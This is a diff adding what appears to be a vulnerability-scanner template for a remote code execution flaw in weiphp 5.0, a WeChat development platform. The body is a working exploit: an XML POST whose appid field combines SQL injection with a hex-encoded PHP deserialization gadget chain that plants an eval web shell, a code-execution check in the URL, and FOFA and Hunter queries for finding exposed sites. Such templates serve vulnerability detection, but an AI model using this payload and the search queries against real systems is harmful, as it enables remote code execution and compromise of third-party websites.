@@ -1,0 +1,25 @@
+name: "!weiphp5.0-rce"         
+rules: 
+  - method: POST               
+    headers: 
+      Content-Type: application/x-www-form-urlencoded    
+    path: /public/index.php/weixin/Notice/index?img=echo+md5(123456);exit();  
+    body:  |
+      <xml>
+      <product_id>aaaa</product_id>
+      <appid>exp</appid>
+      <appid>=0) union select 1,2,3,4,5,6,7,0x4f3a32373a227468696e6b5c70726f636573735c70697065735c57696e646f7773223a313a7b733a33343a22007468696e6b5c70726f636573735c70697065735c57696e646f77730066696c6573223b613a313a7b693a303b4f3a31373a227468696e6b5c6d6f64656c5c5069766f74223a323a7b733a393a22002a00617070656e64223b613a313a7b733a333a226c696e223b613a313a7b693a303b733a323a223131223b7d7d733a31373a22007468696e6b5c4d6f64656c0064617461223b613a313a7b733a333a226c696e223b4f3a31333a227468696e6b5c52657175657374223a353a7b733a373a22002a00686f6f6b223b613a323a7b733a373a2276697369626c65223b613a323a7b693a303b723a383b693a313b733a353a226973436769223b7d733a363a22617070656e64223b613a323a7b693a303b723a383b693a313b733a363a226973416a6178223b7d7d733a393a22002a0066696c746572223b613a313a7b693a303b613a323a7b693a303b4f3a32313a227468696e6b5c766965775c6472697665725c506870223a303a7b7d693a313b733a373a22646973706c6179223b7d7d733a393a22002a00736572766572223b733a313a2231223b733a393a22002a00636f6e666967223b613a313a7b733a383a227661725f616a6178223b733a3       33a22696d67223b7d733a363a22002a00676574223b613a313a7b733a333a22696d67223b733a33303a223c3f70687020406576616c28245f524551554553545b27696d67275d293b223b7d7d7d7d7d7d,9,10,11,12-- </appid>
+      <mch_id>aaa</mch_id>
+      <nonce_str>aaa</nonce_str>
+      <openid>aaa</openid>
+      </xml>                   
+    expression:                        
+      status_code: 200                 #未确认
+      response_header:              
+      response_body: e10adc3949ba59a            
+detail:                           
+  description: "weiphp是一个开源、高效、简洁的微信开发平台,基于oneThink 这个简单而强大的内容管理框架实现的。影响版本weiphp5.0。仍存在该漏洞的网站待验证。"
+  search:             
+    fofa: body="/css/weiphp.css" || title="weiphp" || title="weiphp4.0"
+    鹰图: web.body="/css/weiphp.css" or web.title="weiphp" or web.title="weiphp4.0"
+    
